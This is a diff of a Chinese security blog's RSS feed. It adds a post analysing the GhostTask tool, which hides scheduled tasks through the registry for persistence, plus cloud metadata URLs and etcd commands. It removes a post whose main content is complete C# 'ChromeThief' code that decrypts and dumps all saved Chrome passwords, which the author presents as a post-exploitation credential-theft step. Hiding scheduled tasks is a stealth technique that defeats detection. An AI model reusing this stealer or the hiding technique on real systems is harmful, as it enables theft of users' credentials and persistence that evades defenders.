@@ -5,9 +5,88 @@
     <description> &lt;h1&gt;P001water@c:\Users\maylas\.ssh&lt;/h1&gt; &lt;h3&gt;Do Enjoy youself in hack life&lt;/h3&gt; --------CMD /c 这里是朴水... ... Reply from 1988 !-------</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 27 Oct 2023 10:18:22 +0800</pubDate>
-    <lastBuildDate>Fri, 27 Oct 2023 10:18:22 +0800</lastBuildDate>
+    <pubDate>Wed, 01 Nov 2023 15:41:28 +0800</pubDate>
+    <lastBuildDate>Wed, 01 Nov 2023 15:41:28 +0800</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>持久化-GhostTask-注册表创建计划任务-分析和学习</title>
+        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;
+
+&lt;p&gt;最近一周刚放出来的一个持久化工具 &lt;a href=&quot;https://github.com/netero1010/GhostTask&quot;&gt;netero1010/GhostTask (github.com)&lt;/a&gt;。利用计划任务实现持久化。&lt;/p&gt;
+
+&lt;p&gt;号称能够对抗取证调查、利用Silver Ticket创建计划任务横向。&lt;/p&gt;
+
+&lt;p&gt;win32编程本身也有对 Task Scheduler的支持 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/taskschd/c-c-code-example-creating-a-task-using-newworkitem&quot;&gt;C/C++ Code Example Creating a Task Using NewWorkItem&lt;/a&gt;。之前也写过一个调用api的创建计划任务的持久化工具，痛点就是一查就查出来了 ：)&lt;/p&gt;
+
+&lt;p&gt;不同的是GhostTask单纯从注册表的角度实现了计划任务的创建，还能够一定程度上实现计划任务的隐蔽。本文对其进行分析学习&lt;/p&gt;
+
+&lt;h1 id=&quot;usage-show&quot;&gt;Usage Show&lt;/h1&gt;
+
+&lt;p&gt;首先，需要 “&lt;strong&gt;NT AUTHORITY/SYSTEM&lt;/strong&gt;” 权限（），command&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GhostTask.exe localhost add demo &quot;cmd.exe&quot; &quot;/c notepad.exe&quot; LAB\Administrator weekly 14:12 monday,thursday
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101000141923.png&quot; alt=&quot;image-20231101000141923&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;创建的计划任务名为demo，在事件查看器确实没有发现&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101000406482.png&quot; alt=&quot;image-20231101000406482&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回看注册表，依然能观察到创建的 demo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101000629285.png&quot; alt=&quot;image-20231101000629285&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101000652510.png&quot; alt=&quot;image-20231101000652510&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注册表读写&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101110726512.png&quot; alt=&quot;image-20231101110726512&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;代码分析&quot;&gt;代码分析&lt;/h1&gt;
+
+&lt;p&gt;main函数逻辑很清晰，关键的两个函数 AddScheduleTask() 和 DeleteScheduleTask()&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101115749587.png&quot; alt=&quot;image-20231101115749587&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;func-addscheduletask&quot;&gt;Func AddScheduleTask()&lt;/h1&gt;
+
+&lt;p&gt;我比较感兴趣的就是他如何实现有效隐藏计划任务，关键代码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101123747790.png&quot; alt=&quot;image-20231101123747790&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;原理是22 年的 Microsoft的一篇威胁报告&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/&quot;&gt;Tarrask 恶意软件使用计划任务进行防御规避&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101124004490.png&quot; alt=&quot;image-20231101124004490&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;修改删除 SD 键值的value，计划任务并不会被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;schtasks /query&lt;/code&gt; 命令或者 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;任务计划程序&lt;/code&gt; 显示。但是修改这个键值需要 System 用户的权限。&lt;/p&gt;
+
+&lt;p&gt;MicroSoft 还提出个建议，完全删除 Tree和Tasks 两个注册表项以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Windows\System32\Tasks&lt;/code&gt; 中创建的 XML 文件，任务将继续根据定义的触发器运行，还能做到无文件持久化，直到系统重新启动或者任务关联的svchost.exe进程终止&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20231101141417823.png&quot; alt=&quot;image-20231101141417823&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;还顺带嘲讽了一波。完&lt;/p&gt;
+
+&lt;p&gt;贴图后用&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/0mQKUdDGJrdCldJbV.png&quot; alt=&quot;img&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/&quot;&gt;Tarrask 恶意软件使用计划任务进行防御规避&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%8C%81%E4%B9%85%E5%8C%96/2023/10/22/%E6%8C%81%E4%B9%85%E5%8C%96-GhostTask-%E5%88%86%E6%9E%90%E5%92%8C%E5%AD%A6%E4%B9%A0.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%8C%81%E4%B9%85%E5%8C%96/2023/10/22/%E6%8C%81%E4%B9%85%E5%8C%96-GhostTask-%E5%88%86%E6%9E%90%E5%92%8C%E5%AD%A6%E4%B9%A0.html</guid>
+        
+        
+        <category>持久化</category>
+        
+      </item>
     
       <item>
         <title>Windows cmd and Powershell Obfuscation</title>
@@ -18,8 +97,8 @@
 &lt;p&gt;&lt;a href=&quot;https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring&quot;&gt;PowerShell Obfuscation using SecureString (wietzebeukema.nl)&lt;/a&gt;&lt;/p&gt;
 </description>
         <pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/cmd/powershell/2023/10/22/Hvv%E6%BC%AB%E6%B8%B8%E6%97%A5%E8%AE%B0%E4%B8%8E%E6%80%9D%E8%80%83-(copy).html</link>
-        <guid isPermaLink="true">http://localhost:4000/cmd/powershell/2023/10/22/Hvv%E6%BC%AB%E6%B8%B8%E6%97%A5%E8%AE%B0%E4%B8%8E%E6%80%9D%E8%80%83-(copy).html</guid>
+        <link>http://localhost:4000/cmd/powershell/2023/10/22/Windows-cmd-and-Powershell-Obfuscation.html</link>
+        <guid isPermaLink="true">http://localhost:4000/cmd/powershell/2023/10/22/Windows-cmd-and-Powershell-Obfuscation.html</guid>
         
         
         <category>cmd</category>
@@ -1410,6 +1489,52 @@ https://www.smtp2go.com/ //注册难
   &lt;li&gt;微信小程序反编译&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;h1 id=&quot;六大云元数据地址速查&quot;&gt;六大云元数据地址速查&lt;/h1&gt;
+
+&lt;p&gt;AWS
+http://169.254.169.254/latest/meta-data/&lt;/p&gt;
+
+&lt;p&gt;Google Cloud
+http://metadata/computeMetadata/v1/&lt;/p&gt;
+
+&lt;p&gt;Azure
+http://169.254.169.254/metadata/instance?api-version=2017-04-02&lt;/p&gt;
+
+&lt;p&gt;Oracle Cloud
+http://169.254.169.254/opc/v1/instance/&lt;/p&gt;
+
+&lt;p&gt;阿里云http://100.100.100.200/latest/meta-data/&lt;/p&gt;
+
+&lt;p&gt;腾讯云
+http://metadata.tencentyun.com/latest/meta-data/&lt;/p&gt;
+
+&lt;p&gt;华为云
+&lt;a href=&quot;http://169.254.169.254/&quot;&gt;http://169.254.169.254&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;k8s常用命令&quot;&gt;k8s常用命令&lt;/h1&gt;
+
+&lt;h2 id=&quot;etcd数据库&quot;&gt;etcd数据库&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl  get pods etcd-master -n kube-system -owide
+#查看etcd的pod在哪个节点上
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;etcdctl get / --prefix=true --keys-only     #列出整个根目录的keys
+
+\etcdctl.exe --endpoints=42.247.81.54:2379 member list #etcd 指定远程节点
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;云原生 4C 安全模型，是指在四个层面上考虑云原生的安全：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cloud（云或基础设施层）&lt;/li&gt;
+  &lt;li&gt;Cluster（Kubernetes 集群层）&lt;/li&gt;
+  &lt;li&gt;Container（容器层）&lt;/li&gt;
+  &lt;li&gt;Code（代码层）&lt;/li&gt;
+&lt;/ul&gt;
+
 &lt;hr /&gt;
 
 &lt;p&gt;未完……&lt;/p&gt;
@@ -1621,210 +1746,6 @@ https://www.smtp2go.com/ //注册难
         <category>CTF</category>
         
         <category>AWD线下</category>
-        
-      </item>
-    
-      <item>
-        <title>渗透取证技巧--Chrome浏览器密码凭据窃取和C#实现</title>
-        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;
-
-&lt;p&gt;权限维持的重要步骤，抓密码。本文通过对Windows DPAPI的基本认识和chrome密码加密机制的理解基础上，编写C#代码实现对chrome浏览器密码的解密&lt;/p&gt;
-
-&lt;p&gt;实际利用下，最好是通过go，c/c++这种改写或者编到cs的插件中，基于.net平台还是有点麻烦，得准备两三个版本。&lt;/p&gt;
-
-&lt;h1 id=&quot;chrome的加密过程&quot;&gt;Chrome的加密过程&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;将用户保存的账户密码使用AES GCM加密&lt;/li&gt;
-  &lt;li&gt;将AES加密密钥通过Windows DPAPI加密保存在名为Local State的文件中，文件以json格式存储。&lt;/li&gt;
-  &lt;li&gt;将初始化向量与密文连接起来，并将它们保存在名为Login Data的文件中，文件以sqlite数据库形式存储。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;local-state加密密钥存放的位置&quot;&gt;Local State——加密密钥存放的位置&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Login Data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;文件以json格式储存，encrypted_key 的值就是Windows dpapi加密过后的AES密钥&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230628135158057.png&quot; alt=&quot;image-20230628135158057&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;login-data密文存放的位置&quot;&gt;Login Data——密文存放的位置&lt;/h2&gt;
-
-&lt;p&gt;Sqlite3数据库&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;数据库结构，我们需要注意的几个字段的值&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;origin_url: 起始url
-action_url: form表单提交的地址
-username_value  用户名字段
-password_value 密码字段
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;origin_url和action_url的选择需要注意，有时候用户手动添加的账户密码没有action_url字段的值。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230628140800353.png&quot; alt=&quot;image-20230628140800353&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;aes-解密过程&quot;&gt;AES-解密过程&lt;/h2&gt;
-
-&lt;p&gt;AES-GCM解密不仅需要密钥，还需要偏移量。我们从Local Data数据库提取我们需要的字段，ciphey的值是密码AES加密后的值&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/image-20230628143438678.png&quot; alt=&quot;image-20230628143438678&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;它包含了两个重要的值：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Initialization vector （初始化向量）&lt;/li&gt;
-  &lt;li&gt;Encrypted passwords （加密后的密码）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;用python代码解释这两者的位置，&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;initialisation_vector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;encrypted_password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;按照上面的流程实现代码如下&lt;/p&gt;
-
-&lt;h1 id=&quot;c-代码实现&quot;&gt;C# 代码实现&lt;/h1&gt;
-
-&lt;p&gt;为什么用C#？&lt;/p&gt;
-
-&lt;p&gt;刚开始想写个powershell的脚本调用的，但是实战装库等情况复杂。可能还是类C的实现实用&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
-using System.Text;
-using System.IO;
-using System.Data.SQLite;
-using System.Linq;
-using Org.BouncyCastle.Crypto.Engines;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Parameters;
-using System.Security.Cryptography;
-
-
-namespace ChromeThief
-{
-    class Program
-    {
-        // GLOBAL CONSTANT
-        private static readonly string CHROME_PATH_LOCAL_STATE = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @&quot;Google\Chrome\User Data\Local State&quot;);
-        private static readonly string CHROME_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @&quot;Google\Chrome\User Data&quot;);
-
-        private static String DecryptPassword(byte[] encryptedPassword, byte[] iv, byte[] secretKey)
-        {
-            string sR = string.Empty; 
-            try
-            {
-                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
-                AeadParameters parameters = new AeadParameters(new KeyParameter(secretKey), 128, iv, null);
-
-                cipher.Init(false, parameters);
-                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedPassword.Length)];
-                Int32 retLen = cipher.ProcessBytes(encryptedPassword, 0, encryptedPassword.Length, plainBytes, 0);
-                cipher.DoFinal(plainBytes, retLen);
-
-                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd(&quot;\r\n\0&quot;.ToCharArray());
-                //Console.WriteLine(sR);
-                return sR;
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine($&quot;{e.Message}&quot;);
-                Console.WriteLine(&quot;[ERR] Unable to decrypt, Chrome version &amp;lt;80 not supported. Please check.&quot;);
-                return null;
-            }
-        }
-
-
-        private static byte[] GetSecretKey()
-        {
-            try
-            {
-                // Get secretkey from chrome local state
-                var localState = File.ReadAllText(CHROME_PATH_LOCAL_STATE);
-                dynamic json = Newtonsoft.Json.JsonConvert.DeserializeObject(localState);
-                String key = json.os_crypt.encrypted_key;
-                byte[] encryptedKeyBytes = Convert.FromBase64String(key);
-                //Console.WriteLine(encryptedKeyBytes);
-                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
-                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKey.Length);
-                byte[] secretKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.LocalMachine);
-                //Console.WriteLine(BitConverter.ToString(secretKey));  
-                return secretKey;
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine($&quot;{e.Message}&quot;);
-                Console.WriteLine(&quot;[ERR] Chrome secretkey cannot be found&quot;);
-                return null;
-            }
-        }
-        
-                static void Main(string[] args)
-        {
-            //Console.WriteLine(CHROME_PATH_LOCAL_STATE);
-            //Console.WriteLine(CHROME_PATH);
-            var folders = Directory.GetDirectories(CHROME_PATH, &quot;Profile*&quot;).Union(Directory.GetDirectories(CHROME_PATH, &quot;Default&quot;));
-            var secretKey = GetSecretKey();
-            //C: \Users\86176\AppData\Local\Google\Chrome\User Data\Default
-
-            foreach (var folder in folders)	
-            {
-                //Console.WriteLine(folder);
-                var chromePathLoginDb = Path.Combine(folder, &quot;Login Data&quot;);
-                string connectionString = String.Format(&quot;Data Source={0};Version=3;&quot;, chromePathLoginDb);
-                var conn = new SQLiteConnection(connectionString);
-                conn.Open();
-                SQLiteCommand cmd = new SQLiteCommand(&quot;SELECT origin_url, username_value, password_value FROM logins&quot;, conn);
-                var reader = cmd.ExecuteReader();
-                while (reader.Read())
-                {
-                    var url = reader.GetString(0);
-                    var username = reader.GetString(1);
-                    var ciphertext = (byte[])reader.GetValue(2);
-                    //Console.WriteLine(ciphertext);
-
-                    if (!string.IsNullOrEmpty(url) &amp;amp;&amp;amp; !string.IsNullOrEmpty(username) &amp;amp;&amp;amp; ciphertext != null)
-                    {
-                        // Filter the initialisation vector &amp;amp; encrypted password from ciphertext
-                        //byte[] iv = new byte[12];
-                        //Array.Copy(ciphertext, 3, iv, 0, 12);
-                        ////System.Array.Copy(encryptedData, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
-                        //byte[] encryptedPassword = new byte[ciphertext.Length - 15 - 16];
-                        //Array.Copy(ciphertext, 15, encryptedPassword, 0, ciphertext.Length - 15 - 16);
-                        byte[] iv = new byte[12];
-                        byte[] ciphertextTag = new byte[ciphertext.Length - 3 - iv.Length];
-
-                        System.Array.Copy(ciphertext, 3, iv, 0, iv.Length);
-                        System.Array.Copy(ciphertext, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
-                        // Use AES algorithm to decrypt the password
-                        Console.WriteLine($&quot;URL: {url}\nUser Name: {username}&quot;);
-                        var decryptedPassword = DecryptPassword(ciphertextTag, iv, secretKey);
-                        Console.WriteLine($&quot;Password: {decryptedPassword}\n&quot;);
-
-                    }
-                }
-            }
-        }
-
-    }
-}
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>
-        <pubDate>Fri, 12 May 2023 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html</link>
-        <guid isPermaLink="true">http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html</guid>
-        
-        
-        <category>取证</category>
-        
-        <category>windows DPAPI</category>
         
       </item>
     
